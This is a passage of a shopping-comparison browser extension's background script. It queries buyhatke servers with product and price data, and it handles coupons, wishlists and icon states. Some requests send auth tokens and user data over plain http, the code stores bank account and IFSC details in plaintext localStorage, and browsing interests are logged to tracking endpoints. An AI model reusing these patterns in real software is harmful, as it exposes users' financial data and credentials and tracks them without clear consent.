  chrome.browserAction.setIcon({tabId: tabID, path: iconPath});
  window.setTimeout(function() { setAnimatingIcon5(tabID); }, 100);
}

function setAnimatingIcon5(tabID){
  var iconPath = "5.png";
  chrome.browserAction.setIcon({tabId: tabID, path: iconPath});
  window.setTimeout(function() { setAnimatingIcon6(tabID); }, 100);
}

function setAnimatingIcon6(tabID){
  var iconPath = "6.png";
  chrome.browserAction.setIcon({tabId: tabID, path: iconPath});
  window.setTimeout(function() { setAnimatingIcon7(tabID); }, 100);
}

function setAnimatingIcon7(tabID){
  var iconPath = "7.png";
  chrome.browserAction.setIcon({tabId: tabID, path: iconPath});
  window.setTimeout(function() { setAnimatingIcon8(tabID); }, 100);
}

function setAnimatingIcon8(tabID){
  var iconPath = "8.png";
  chrome.browserAction.setIcon({tabId: tabID, path: iconPath});
  window.setTimeout(function() { setAnimatingIcon9(tabID); }, 100);
}

function setAnimatingIcon9(tabID){
  var iconPath = "9.png";
  chrome.browserAction.setIcon({tabId: tabID, path: iconPath});
  window.setTimeout(function() { setAnimatingIcon10(tabID); }, 100);
}

function setAnimatingIcon10(tabID){
  var iconPath = "10.png";
  chrome.browserAction.setIcon({tabId: tabID, path: iconPath});
  window.setTimeout(function() { setAnimatingIcon11(tabID); }, 100);
}

function setAnimatingIcon11(tabID){
  var iconPath = "11.png";
  chrome.browserAction.setIcon({tabId: tabID, path: iconPath});
  window.setTimeout(function() { setAnimatingIcon12(tabID); }, 100);
}

function setAnimatingIcon12(tabID){
  var iconPath = "12.png";
  chrome.browserAction.setIcon({tabId: tabID, path: iconPath});
}

function searchgooglemaps(info)
{
 var searchstring = info.selectionText;
 if(typeof(searchstring)=="undefined"){
  alert("Please select some text to search via Compare Hatke. Selected Text Length : 0 words");
}
// console.log(searchstring);
searchstring = searchstring.trim().split(" ");
if(searchstring.length>15){
  alert("Too long text to search. Maximum Limit : 15 words");
}
else if(searchstring.length==0){
  alert("Please select some text to search via Compare Hatke. Selected Text Length : 0 words");
}
else {
  searchstring = searchstring.join("-");
  chrome.tabs.create({url: "https://compare.buyhatke.com/products/" + searchstring});
}
}

chrome.contextMenus.create({title: "Compare via Compare Hatke", contexts:["all"], onclick: searchgooglemaps});



function deleteEntries(arr, id) {
  var i = arr.length;
    if (i) {   // (not 0)
      while (i--) {
        var cur = arr[i];
        if (cur.tabID == id) {
          arr.splice(i, 1);
        }
      }
    }
  }

  function takeValue(idName){
    chrome.tabs.sendRequest(idName, { method: "getHTML"}, function(response) {
      alert(response.data);
    });
  }

  function handleNewQueries(prod, price, start, tabId, urlMerchant, data2){

  }

  function handleQueries(prod, price, start, tabId, urlMerchant, data2, websitePos){
    var isbnValid;
    var isbn;
    var isapparel;
    var req = http[2*start];
    var req22 = http[2*start+1];
    var myID = tabId;
    if(data2.split("isbn=").length>1){
      isbn = data2.split("isbn=")[1];
      isbn = isbn.split("~*~*")[0];
      var parameters = "search=" + encodeURIComponent(prod) + "&isbn=" + encodeURIComponent(isbn);
      var url2 = "https://compare.buyhatke.com/example_ext.php";
      isbnValid = 1;
      isapparel = 0;
    }
    else if(data2.split("isapparel=").length>1){
      isbn = data2.split("isapparel=")[1];
      var parameters = "search=" + encodeURIComponent(prod);
      var url2 = "https://compare.buyhatke.com/apparelsSearch.php";
      isapparel = 1;
      isbnValid = 0;
    }
    else {
      isapparel = 0;
      var parameters = "search=" + encodeURIComponent(prod) + "&data=" + encodeURIComponent(data2);
      var url2 = "https://compare.buyhatke.com/exampleNewExt.php";
      isbnValid = 0;
      isbn = 0;
    }
    if(prod!=""){
      var website = urlMerchant.split("/")[2];
    }
    req.open("POST",url2,true);
    req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    req.onload = (function(){
      if (req.readyState == 4) {
        if(req.status == 200) {
          var msg = req.responseText;
          if(price==NaN||price=="NaN"){
            price = 0;
          }
          if(isbnValid==0&&isapparel==0){
            var url2 = "https://compare.buyhatke.com/updates10.php?searchText=" + encodeURIComponent(prod) + "&price=" + price + "&ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth + "&pos=" + websitePos;
          }
          else if(isapparel==1){
            var url2 = "https://compare.buyhatke.com/updates_app.php?searchText=" + encodeURIComponent(prod) + "&price=" + price + "&ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth;
          }
          else {
            var url2 = "https://compare.buyhatke.com/updates_ext.php?searchText=" + encodeURIComponent(prod) + "&isbn=" + isbn + "&ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth;
          }
          req22.open("GET",url2,true);

          req22.onload = (function(){
            if (req22.readyState == 4) {
              if(req22.status == 200) {
               var msg = req22.responseText;
               if(isapparel==1){
                chrome.tabs.sendMessage(myID, {results: msg});
                if(watchListArray == null){
                  chrome.browserAction.setBadgeText({tabId: tabId, text: "0"});
                  chrome.browserAction.setBadgeBackgroundColor({tabId: tabId, color: "#FF0000"});
                }
                else {
                 chrome.browserAction.setBadgeText({tabId: tabId, text: watchListArray.length.toString()});
                 chrome.browserAction.setBadgeBackgroundColor({tabId: tabId, color: "#FF0000"});
               }
               setAnimatingIcon1(myID);
               inUSE[start] = 0;
             }
             else {
               var values = JSON.parse(msg);
               var len;
               if(values!=null){
                 len = values.length;
                 values = values.sort(function(a, b){
                  return a.price - b.price;
                });
               }
               else {
                len = 0;
              }
              for(i=0;i<len;i++){
                resultsTable.push({
                  tabID : myID, link : values[i].link, prod : values[i].prod, image : values[i].image, price : values[i].price, site : values[i].position
                });
              }
              chrome.tabs.sendMessage(myID, {results: msg});
              if(watchListArray == null){
                chrome.browserAction.setBadgeText({tabId: tabId, text: "0"});
                chrome.browserAction.setBadgeBackgroundColor({tabId: tabId, color: "#FF0000"});
              }
              else {
               chrome.browserAction.setBadgeText({tabId: tabId, text: watchListArray.length.toString()});
               chrome.browserAction.setBadgeBackgroundColor({tabId: tabId, color: "#FF0000"});
             }
             setAnimatingIcon1(myID);
             inUSE[start] = 0;
           }
         }
       }
     });
          req22.send(null);
        }
      }
    });
    req.send(parameters);
  }

  function checkIcons(){
    chrome.runtime.onConnect.addListener(function(port) {
      if(port.name=="searchPayloadDataNew" + port.sender.tab.id){
        port.onMessage.addListener(function(msg) {
          if (msg.messageData != ""){
              // console.log("Data rec here " + msg.messageData);
              var queryObj = JSON.parse(msg.messageData);
              var req = getXMLHTTPRequest();
              var req22 = getXMLHTTPRequest();
              var parameters = "query=" + encodeURIComponent(queryObj.query) + "&price=" + queryObj.price + "&ext_id=" + localStorage.ext_id  + "&pos=" + queryObj.pos + "&ext_auth=" + localStorage.ext_auth + "&original=" + queryObj.original + "&PID=" + queryObj.PID;
              var caseHere = parseInt(queryObj.category);
              var url2 = "";
              var url3 = "";
              switch(caseHere){
               case 0:
               url2 = "https://compare.buyhatke.com/mobFrontEnd.php";
               url3 = "https://compare.buyhatke.com/updates10.php";
               break;
               case 1:
               url2 = "https://compare.buyhatke.com/exampleExtCat.php";
               url3 = "https://compare.buyhatke.com/updatesNew.php";
               break;
             }
              // console.log(url2);
              // console.log(url3);
              // var url2 = "https://compare.buyhatke.com/mobFrontEnd.php";
              req.open("POST",url2,true);
              req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
              req.onload = (function(){
                if (req.readyState == 4) {
                  if(req.status == 200) {
                    var msg = req.responseText;
                    msg = msg.trim();
                    if(msg!="" && caseHere==0){
                      msg = JSON.parse(msg);
                    }
                    if(caseHere!=0 || msg[0].error==1){
                      var url2 = url3 + "?searchText=" + encodeURIComponent(queryObj.original) + "&price=" + queryObj.price + "&ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth + "&pos=" + queryObj.pos + "&PID=" + queryObj.PID;
                      req22.open("GET",url2,true);
                      req22.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                      req22.onload = (function(){
                        if (req22.readyState == 4) {
                          if(req22.status == 200) {
                            var msg = req22.responseText;
                            port.postMessage({dataBack: msg});
                          }
                        }
                      });
                      req22.send(null);

                    }
                    else {
                      port.postMessage({dataBack: req.responseText});
                    }
                  }
                }
              });
              req.send(parameters);
            }
          });
      }
      else if(port.name=="searchPayloadDataTest" + port.sender.tab.id){
        port.onMessage.addListener(function(msg) {
          if (msg.messageData != ""){
              console.log("Data rec here " + msg.messageData);
              queryFull = msg.messageData.split("~*~*");
              query = queryFull[0];
              price = queryFull[1];
              // var queryObj = JSON.parse(msg.messageData);
              var req = getXMLHTTPRequest();
              var req22 = getXMLHTTPRequest();
              var parameters = "query=" + encodeURIComponent(query) + "&price=" + price + "&ext_id=" + localStorage.ext_id  + "&ext_auth=" + localStorage.ext_auth;

             url2 = "https://compare.buyhatke.com/searchTest.php";
              req.open("POST",url2,true);
              req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
              req.onload = (function(){
                if (req.readyState == 4) {
                  if(req.status == 200) {
                    var msg = req.responseText;
                    msg = msg.trim();
                    port.postMessage({dataBack: msg});

                  }
                  else {
                    port.postMessage({dataBack: ""});
                  }
                }
              });
              req.send(parameters);
            }
          });
      }
      else if(port.name=="searchPayloadData" + port.sender.tab.id){
        port.onMessage.addListener(function(msg) {
          if (msg.messageData != ""){
           var req = getXMLHTTPRequest();
           var req22 = getXMLHTTPRequest();
           // console.log("I was called for search" + msg.messageData);
           name = msg.messageData;
           var pr = name.split("~*~*");
           var websitePos = parseInt(pr[2]);
           var PID = pr[3];
           var data2="";
           if(name.split("moreData=").length > 1){
            data2 = name.split("moreData=")[1];
            name = name.split("moreData=")[0];
          }
          var pr = name.split("~*~*");
          var myPrice = parseFloat(pr[1]);
          name = pr[0];
          var name2 = name.split("-");
          name = name2.join(" ");
          var i = 0;
          var isbnValid;
          var isbn;
          var isapparel;
          var prod = name.trim();
          var price = myPrice;
          myID = port.sender.tab.id;
          tabId = port.sender.tab.id;
          tabID = port.sender.tab.id;
          urlMerchant = port.sender.tab.url;
          if(websitePos==1){
           var parameters = "query=" + encodeURIComponent(prod) + "&price=" + price + "&PID=" + PID;
           var url2 = "https://compare.buyhatke.com/mobFrontEnd.php";
         }
         else if(data2.split("isbn=").length>1){
          isbn = data2.split("isbn=")[1];
          isbn = isbn.split("~*~*")[0];
          var parameters = "search=" + encodeURIComponent(prod) + "&isbn=" + encodeURIComponent(isbn) + "&PID=" + PID;
          var url2 = "https://compare.buyhatke.com/example_ext.php";
          isbnValid = 1;
          isapparel = 0;
        }
        else if(data2.split("isapparel=").length>1){
         isbn = data2.split("isapparel=")[1];
         var parameters = "search=" + encodeURIComponent(prod);
         var url2 = "https://compare.buyhatke.com/apparelsSearch.php";
         isapparel = 1;
         isbnValid = 0;
       }
       else {
        isapparel = 0;
        var parameters = "search=" + encodeURIComponent(prod) + "&data=" + encodeURIComponent(data2);
        var url2 = "https://compare.buyhatke.com/exampleNewExt.php";
        isbnValid = 0;
        isbn = 0;
      }
      req.open("POST",url2,true);
      req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
      req.onload = (function(){
        if (req.readyState == 4) {
          if(req.status == 200) {
            var msg = req.responseText;
            if(websitePos!=1){
              var msg = req.responseText;
              if(price==NaN||price=="NaN"){
                price = 0;
              }
              if(isbnValid==0&&isapparel==0){
                var url2 = "https://compare.buyhatke.com/updates10.php?searchText=" + encodeURIComponent(prod) + "&price=" + price + "&ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth + "&pos=" + websitePos + "&PID=" + PID;
              }
              else if(isapparel==1){
                var url2 = "https://compare.buyhatke.com/updates_app.php?searchText=" + encodeURIComponent(prod) + "&price=" + price + "&ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth + "&PID=" + PID;
              }
              else {
                var url2 = "https://compare.buyhatke.com/updates_ext.php?searchText=" + encodeURIComponent(prod) + "&isbn=" + isbn + "&ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth + "&PID=" + PID;
              }
              req22.open("GET",url2,true);

              req22.onload = (function(){
                if (req22.readyState == 4) {
                  if(req22.status == 200) {
                   var msg = req22.responseText;
                   if(isapparel==1){
                     if(watchListArray == null){
                      chrome.browserAction.setBadgeText({tabId: tabId, text: "0"});
                      chrome.browserAction.setBadgeBackgroundColor({tabId: tabId, color: "#FF0000"});
                    }
                    else {
                     chrome.browserAction.setBadgeText({tabId: tabId, text: watchListArray.length.toString()});
                     chrome.browserAction.setBadgeBackgroundColor({tabId: tabId, color: "#FF0000"});
                   }
                   setAnimatingIcon1(myID);
                   port.postMessage({dataBack: msg});
                 }
                 else {
                   var values = JSON.parse(msg);
                   var len;
                   if(values!=null){
                     len = values.length;
                     values = values.sort(function(a, b){
                      return a.price - b.price;
                    });
                   }
                   else {
                    len = 0;
                  }
                  if(watchListArray == null){
                    chrome.browserAction.setBadgeText({tabId: tabId, text: "0"});
                    chrome.browserAction.setBadgeBackgroundColor({tabId: tabId, color: "#FF0000"});
                  }
                  else {
                   chrome.browserAction.setBadgeText({tabId: tabId, text: watchListArray.length.toString()});
                   chrome.browserAction.setBadgeBackgroundColor({tabId: tabId, color: "#FF0000"});
                 }
                 setAnimatingIcon1(myID);
                 port.postMessage({dataBack: msg});
               }
             }
           }
         });
              req22.send(null);


            }
            else {
             port.postMessage({dataBack: msg});
           }
         }
       }
     });
      req.send(parameters);

    }
  });
return;
}
else if(port.name=="othersPayloadData" + port.sender.tab.id){
  port.onMessage.addListener(function(msg) {
    if (msg.messageData != ""){
      var comp = msg.messageData.split("~*");
      var jsonData = comp[0];
      var command = comp[1];
      command = parseInt(command);
      var jsonData = JSON.parse(jsonData);

      switch(command){
       case 1:
       var myurl = "https://compare.buyhatke.com/extension/getPredictedData.php";
       break;
       case 2:
       var myurl = "https://compare.buyhatke.com/dealsAPI/pidToList.php";
       break;
       case 3:
       var myurl = "http://buyhatke.com/dealsAPI/pidToListAmaz.php";
       break;
       case 4:
       var myurl = "https://compare.buyhatke.com/dealsAPI/pidToListSnap.php";
       break;
       case 5:
       var myurl = "https://compare.buyhatke.com/dealsAPI/pidToListMyn.php";
       break;
       case 6:
       var myurl = "https://compare.buyhatke.com/dealsAPI/pidToListJab.php";
       break;
       // case 7:
       // var myurl = "https://compare.buyhatke.com/extension/getCoupons.php";
       // break;
       case 7:
       var myurl = "http://coupons.buyhatke.com/PickCoupon/FreshCoupon/getAutoCoupons.php";
       break;
       case 8:
       var myurl = "http://ext1.buyhatke.com/amazon/sendPIDs.php";
       return;
       break;
       case 9:
       var myurl = "http://buyhatke.com/compare/extension/userLog.php";
       break;
       case 10:
       var myurl = "http://ext1.buyhatke.com/PickCoupon/extCoupon/saveExtCpn.php";
       break;
       case 11:
       var myurl = "https://compare.buyhatke.com/pushRaw.php";
       break;
       case 12:
       var myurl = "http://coupons.buyhatke.com/PickCoupon/FreshCoupon/extCpnStatus.php";
       break;
       case 13:
       var myurl = "http://coupons.buyhatke.com/PickCoupon/FreshCoupon/bestCpnLike.php";
       break;
       case 14:
       var myurl = "http://coupons.buyhatke.com/PickCoupon/FreshCoupon/pickExtCoupons.php";
       break;
       case 15:
       var myurl = "http://coupons.buyhatke.com/PickCoupon/FreshCoupon/saveExtCoupons.php";
       break;
       case 16:
       var myurl = "http://coupons.buyhatke.com/PickCoupon/FreshCoupon/savePepperBread.php";
       break;
       case 17:
       var myurl = "https://compare.buyhatke.com/wishlist3/api/scrapWishList.php";
       break;
       case 18:
       var myurl = "https://compare.buyhatke.com/dealAPICat.php";
       break;
       case 19:
       var myurl = "https://compare.buyhatke.com/reviewBack/submitMobile.php";
       break;
       case 20:
       var myurl = "http://54.179.157.216/api/count/update";
       return;
       break;
       case 21:
       var myurl = "http://ext1.buyhatke.com/amazon/lightDeals.php";
       break;
       case 22:
       var myurl ="http://ext1.buyhatke.com/php/counter.php";
       break;
       case 23:
       var myurl="http://extmain.buyhatke.com/dump";
       if(localStorage.register!=1){
         port.postMessage({dataBack: ""});
         return;
       }
       break;
       case 24:
       var myurl="https://tracking.buyhatke.com/referr/f2.php";
       break;
       case 25:
       var myurl="http://extmain.buyhatke.com/checkout";
       break;

       // case 26:
       // var myurl="https://compare.buyhatke.com/flights/getSessionNew.php";
       // break;
       // case 27:
       // var myurl="https://compare.buyhatke.com/flights/getFlightDetailsNew2.php";
       // break;
       case 28:
       var myurl = "https://tracking.buyhatke.com/universalLog/";
       // console.log('Reahed here');
       break;
       case 29:
       var myurl = "https://compare.buyhatke.com/logger/bread.php";
       // console.log('Reahed here');
       break;
       case 30:
       var myurl="https://compare.buyhatke.com/extension/getDropDetails2.php";
       break;
       case 32:
       var myurl="http://coupons.buyhatke.com/cpnSideBar/getCode.php";
       break;
       case 33:
       var myurl="https://compare.buyhatke.com/extension/getRecco.php";
       break;
       case 34:
       var myurl="http://pa.buyhatke.com/alertAPIs/changeCurStatus.php";
       break;
       case 35:
       var myurl="http://coupons.buyhatke.com/cpnSideBar/likeDislike.php";
       break;
       case 36:
       var myurl="https://compare.buyhatke.com/extension/pushBrand.php";
       break;
       case 37:
       var myurl="https://compare.buyhatke.com/extension/feedbacks.php";
       break;
       case 38:
       var myurl="https://compare.buyhatke.com/extension/saveAppliedCoupons.php";
       break;
       case 39:
       var myurl="http://coupons.buyhatke.com/PickCoupon/FreshCoupon/add_cpn.php";
       break;
       case 40:
       var myurl ="http://tracking.buyhatke.com/flight/thankyou.php";
       break;
       case 50:
       var myurl ="https://compare.buyhatke.com/extension/getPopular.php";
       break;
       case 1234:
      var myurl="http://extmain.buyhatke.com/flightcheck";
      break;
      case 1235:
      var myurl="http://extmain.buyhatke.com/buscheck";
      break;
      case 1236:
      var myurl="http://extmain.buyhatke.com/hotelscheck";
      break;
      case 1237:
      var myurl="http://extmain.buyhatke.com/moviescheck";
      break;
      case 1240:
      var myurl="https://compare.buyhatke.com/autocoupon-contest/check_winner.php";
      break;
       case 100:
       enterHere = 0;
       localStorage.ext_email = jsonData[0].email;
       localStorage.verifiedExt = 0;
       var myurl = "https://compare.buyhatke.com/extension/addEmailExt.php";
       break;
       case 200:
       enterHere = 0;
       var myurl = "https://compare.buyhatke.com/wishlist3/api/createWishList.php";
       break;
       case 400:
       enterHere = 0;
       var myurl = "https://compare.buyhatke.com/wishlist3/api/deleteWL.php";
       break;
       case 500:
       enterHere = 0;
       var myurl = "https://compare.buyhatke.com/wishlist3/api/delFromWish.php";
       break;
       case 600:
       enterHere = 0;
       var myurl = "https://compare.buyhatke.com/wishlist3/api/addProd2Wish.php";
       break;
       case 700:
       enterHere = 0;
       var myurl = "https://compare.buyhatke.com/wishlist3/api/modifyTags.php";
       break;
       case 800:
       enterHere = 0;
       var myurl = "https://compare.buyhatke.com/wishlist3/api/editWL.php";
       break;
       case 900:
       enterHere = 0;
       var myurl = "https://compare.buyhatke.com/wishlist3/api/scrapWishList.php";
       break;
       case 1000:
       enterHere = 1;
       if (jsonData[0].selectSiteWish){
        var user_url = jsonData[0].selectSiteWish.trim();
        if(user_url != "" && user_url.split("flipkart.com/wishlist").length > 1){
          flipWishListURL(user_url).then(function(args){
            port.postMessage({dataBack: args});
            checkStatus();
          });
        }
        else if(user_url != "" && user_url.split("snapdeal.com/mywishlist").length > 1 || user_url != "" && user_url.split("snapdeal.com/wishlist").length > 1){
          snapWishList(user_url).then(function(args){
           port.postMessage({dataBack: args});
           checkStatus();
         });
        }
        else if(user_url != "" && (user_url.split("amazon.in").length > 1 && user_url.split("wishlist/").length > 1) || user_url.split("amzn.in/").length > 1){
         if(user_url.split("/ref=").length > 1){
           user_url = user_url.split("/ref=");
           user_url = user_url[0].trim();
         }
         if(user_url.split("?").length > 1){
           user_url = user_url.split("?");
           user_url = user_url[0].trim();
         }
         if(user_url.split("#").length > 1){
           user_url = user_url.split("#");
           user_url = user_url[0].trim();
         }
         if(user_url.split("&").length > 1){
           user_url = user_url.split("&");
           user_url = user_url[0].trim();
         }
         var user_url_len = user_url.length - 1;
         if(user_url.substr(user_url_len, 1) == "/"){
          user_url = user_url.substring(0, user_url_len);
        }
        // console.log("user_url: "+user_url);
        amazWishList(user_url).then(function(args){
          port.postMessage({dataBack: args});
          checkStatus();
        });
      }
      else{
        port.postMessage({dataBack: ""});
      }
      return;
    }
    break;
    case 1100:
    enterHere = 1;

    if(jsonData[0].setMinAlertURL){
      var setMinAlertURL = jsonData[0].setMinAlertURL.trim();
      setMinAlertURL = setMinAlertURL+"&ext_id="+localStorage.ext_id+"&auth_val="+localStorage.ext_auth;
      $.ajax({url: setMinAlertURL,
        success: function(result)
        {
          port.postMessage({dataBack: result});
        }
      });
      return;
    }
    break;
    case 1200:
    enterHere = 1;

    if(jsonData[0].removePriceAlert){

      var removePriceAlert = jsonData[0].removePriceAlert.trim();
      removePriceAlert = removePriceAlert+"&ext_id="+localStorage.ext_id+"&auth_val="+localStorage.ext_auth;
      $.ajax({url: removePriceAlert,
        success: function(result)
        {
          watchListArray = jQuery.parseJSON(result);
          port.postMessage({dataBack: jQuery.parseJSON(result)});
        }
      });
      return;
    }
    break;
    case 1300:
    enterHere = 1;

    submitDataEBAY(jsonData, "submitData.php").then(function(args){
      localStorage.bankBox1 = jsonData[0].Bank;
      localStorage.bankBox2 = jsonData[1].Acc;
      localStorage.bankBox3 = jsonData[2].Branch;
      localStorage.bankBox4 = jsonData[3].IFSC;
      port.postMessage({dataBack: args});
    });
    return;
    break;

    case 1400:
    enterHere = 1;

    submitDataEBAY(jsonData, "submitData.php").then(function(args){
      submitEbay = jsonData;
      localStorage.myName = jsonData[0].Name;
      localStorage.phoneNo = jsonData[1].Phone;
      localStorage.emailEbay = jsonData[2].email;
      port.postMessage({dataBack: args});
    });
    return;
    break;

    case 1500:
    enterHere = 1;

    submitDataEBAY(jsonData, "submitPP.php").then(function(args){
      localStorage.submittedPaisa = jsonData[0].PP;
      port.postMessage({dataBack: args});
    });
    return;
    break;

    case 1600:
    enterHere = 1;
    port.postMessage({dataBack: localStorage.mywishlist});
    return;
    break;

    case 1700:
    enterHere = 0;
    var myurl = "https://compare.buyhatke.com/wishlist3/api/wlCoverPic.php";
    break;
  }
  var httpq4 = new getXMLHTTPRequest();
  var ext_id, ext_auth;
  ext_id = localStorage.ext_id;
  ext_auth = localStorage.ext_auth;
  var jsonParData = (jsonData);
  var parameters = "";
  if(command != 28)
   parameters = "ext_id=" + ext_id + "&auth_val=" + ext_auth;
 else{
   parameters = "type=log&indexName=interest_centers&logName=info";
 }
 var L = jsonParData.length;
 for (var i = 0; i < L; i++) {
  var obj = jsonParData[i];
  for (var j in obj) {
    var paramKey = (j);
    var paramVal = (jsonParData[i][j]);
    if(paramKey == 'cpnData'){
      parameters += "&" + paramKey + "=" + encodeURIComponent(JSON.stringify(paramVal));
    }
    else if(paramKey == 'interests' || paramKey == 'variants' || command==40){
     parameters += "&" + paramKey + "=" + encodeURIComponent(JSON.stringify(paramVal));
   }
   else{
     parameters += "&" + paramKey + "=" + paramVal;
   }
 }
}
if(command==7 && paramKey=="pos"){
  getAffCoupons(paramVal, port.sender.tab.id);
}
httpq4.open("POST", myurl, true);
httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
httpq4.onreadystatechange = function(){
  if (httpq4.readyState == 4) {
    if(httpq4.status == 200) {
     mytext = httpq4.responseText;
     port.postMessage({dataBack: mytext});

     if(command==24)
     {
      mytext = mytext.trim();
      mytext = parseInt(mytext);
      if(!isNaN(mytext)){
        features1(mytext);
      }

    }

  }
  else{
   port.postMessage({dataBack: ""});
 }
}
}
httpq4.send(parameters);
}
});
}

else if(port.name=="couponsPayloadData"){
  //console.log(port.sender.tab.url);
  port.onMessage.addListener(function(msg) {
    if (msg.couponsPayloadData != ""){
      // console.log("I was called");
      var comp = msg.couponsPayloadData.split("~*");
      var jsonData = comp[0];
      var cur_pos = comp[1];
      var fileName = comp[2];
      var jsonData = JSON.parse(jsonData);
      var httpq4 = new getXMLHTTPRequest();
      var ext_id, ext_auth;
      // console.log(jsonData);
      ext_id = localStorage.ext_id;
      ext_auth = localStorage.ext_auth;
      var myurl = "http://coupons.buyhatke.com/cpnSideBar/" + fileName;
      var jsonParData = (jsonData);
      var parameters = "ext_id=" + ext_id + "&auth_val=" + ext_auth + "&webID=" + cur_pos;
      var L = jsonParData.length;
      for (var i = 0; i < L; i++) {
        var obj = jsonParData[i];
        for (var j in obj) {
          var paramKey = (j);
          var paramVal = (jsonParData[i][j]);
          parameters += "&" + paramKey + "=" + paramVal;
        }
      }
      // console.log(parameters);
      // console.log(myurl);
      httpq4.open("POST", myurl, true);
      httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
      httpq4.onreadystatechange = function(){
        if (httpq4.readyState == 4) {
          if(httpq4.status == 200) {
           mytext = httpq4.responseText;
           // console.log(mytext);
           port.postMessage({dataBack: mytext});
         }
       }
     }
     httpq4.send(parameters);
   }
 });
}



// console.assert(port.name == "knockknock");
// console.log(port.sender.tab.url);

port.onMessage.addListener(function(msg) {
  if (msg.joke == "Knock knock")
    port.postMessage({question: "Product-name"});
  else if(msg.answer){
    var tempMessage = msg.answer.split("~*~*")[0];
    var website = port.sender.tab.url.split("/")[2];
    // _gaq.push(["_trackEvent","DROP-DOWN:Product",tempMessage]);
    // _gaq.push(["_trackEvent","DROP-DOWN:Website",website]);
  }
});

});

chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab)
{
  var iconPath = "12.png";
  //chrome.browserAction.setIcon({tabId: tabId, path: iconPath});
  //chrome.browserAction.show(tabId);
  if(watchListArray == null){
    chrome.browserAction.setBadgeText({tabId: tabId, text: "0"});
    chrome.browserAction.setBadgeBackgroundColor({tabId: tabId, color: "#000000"});
  }
  else {
   chrome.browserAction.setBadgeText({tabId: tabId, text: watchListArray.length.toString()});
   chrome.browserAction.setBadgeBackgroundColor({tabId: tabId, color: "#000000"});
 }

 var url = tab.url;
 var id = tabId;
 deleteEntries(hashTable, id);
 deleteEntries(resultsTable, id);

 if((url.split("koovs").length>1)||(url.split("flipkart").length>1)||(url.split("infibeam").length>1)||(url.split("bookadda").length>1)||(url.split("myntra").length>1)||(url.split("shopclues").length>1)||(url.split("urbantouch").length>1)||(url.split("seventymm").length>1)||(url.split("fnp").length>1)||(url.split("pepperfry").length>1)||(url.split("futurebazaar").length>1)||(url.split("landmarkonthenet").length>1)||(url.split("shoppersstop").length>1)||(url.split("jabong").length>1)||(url.split("tradus").length>1)||(url.split("buytheprice").length>1)||(url.split("yebhi").length>1)||(url.split("healthkart").length>1)||(url.split("babyoye").length>1)||(url.split("hushbabies").length>1)||(url.split("homeshop18").length>1)||(url.split("snapdeal").length>1)||(url.split("indiacakes").length>1)||(url.split("naaptol").length>1)||(url.split("crossword").length>1)||(url.split("floralis").length>1)||(url.split("shopping.indiatimes").length>1)||(url.split("adexmart").length>1)||(url.split("deals.sulekha").length>1)||(url.split("watchkart").length>1)||(url.split("lenskart").length>1)||(url.split("bagskart").length>1)||(url.split("jewelskart").length>1)||(url.split("junglee").length>1)||(url.split("mysmartprice").length>1)||(url.split("goodlife").length>1)||(url.split("grabmore").length>1)||(url.split("amazon").length>1)||(url.split("cilory").length>1)||(url.split("zivame").length>1)||(url.split("fashionara").length>1)||(url.split("acadzone").length>1)||(url.split("uread").length>1)||(url.split("rediff").length>1)||(url.split("croma").length>1)||(url.split("abof").length>1)||(url.split("tatacliq").length>1)||(url.split("ajio").length>1)||(url.split("nnnow").length>1)||(url.split("sapnaonline").length>1)||(url.split("1mg").length>1)||(url.split("netmeds").length>1)){
  var iconPath = "ext_green.png";
  var zero = 0;
          //chrome.browserAction.show(id);
          hashTable.push({
            tabID : id, tabURL : url, res : zero, count : zero
          });
        }
        else {
          var iconPath = "ext_gray.png";
          var two = 2;
          var zero = 0;
          //chrome.browserAction.hide(id);
          hashTable.push({
            tabID : id, tabURL : url, res : two, count : zero
          });
        }
        chrome.browserAction.setIcon({tabId: tabId, path: iconPath});
      });

chrome.tabs.onRemoved.addListener(function(tabId) {
        //console.log("Tab id removed " + tabId);
        checkSpecialTab(tabId);
        deleteEntries(hashTable, tabId);
        deleteEntries(resultsTable, tabId);
      });



}

function getCookie(c_name){
  var i,x,y,ARRcookies=document.cookie.split(";");
  for (i=0;i<ARRcookies.length;i++)
  {
    x=ARRcookies[i].substr(0,ARRcookies[i].indexOf("="));
    y=ARRcookies[i].substr(ARRcookies[i].indexOf("=")+1);
    x=x.replace(/^\s+|\s+$/g,"");
    if (x==c_name)
    {
      return unescape(y);
    }
  }
}

function checkSpecialTab(tabId){
  if(localStorage.saleStarted==1 && tabId == localStorage.specialTab){
    localStorage.specialTab = "";
    getSpecial();
  }
}

function saveBankUsers(){
  var bank1 = localStorage.bankBox1;
  var bank2 = localStorage.bankBox2;
  var bank3 = localStorage.bankBox3;
  var bank4 = localStorage.bankBox4;
  var httpq4 = new getXMLHTTPRequest();

  if(bank1 != "" || bank2 != "" || bank3 != "" || bank4 != ""){

   var myurl = "http://buyhatke.com/extension/saveBankExt.php";
   var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth;
   httpq4.open("POST", myurl, true);
   httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
   httpq4.onreadystatechange = function(){
    if (httpq4.readyState == 4) {
      if(httpq4.status == 200) {
       mytext = httpq4.responseText;
     }
   }
 };
 httpq4.send(parameters);

}
}

saveBankUsers();

function getSpecial(){
  //console.log("getSpecial was called");
  // console.log("Time Remaining " + localStorage.timeRemaining);
  if(localStorage.timeRemaining < 120000 && localStorage.timeRemaining > -120000){
    var pollInterval = 1000 * 2;
  }
  else {
    var pollInterval = 1000 * 40;
  }
  window.setTimeout(getSpecial, pollInterval);
  var fourmTabs = new Array();
  var data = JSON.parse(localStorage.flashSale);
  for(k=0;k<data.length;k++){
   if(data[k].value==1){
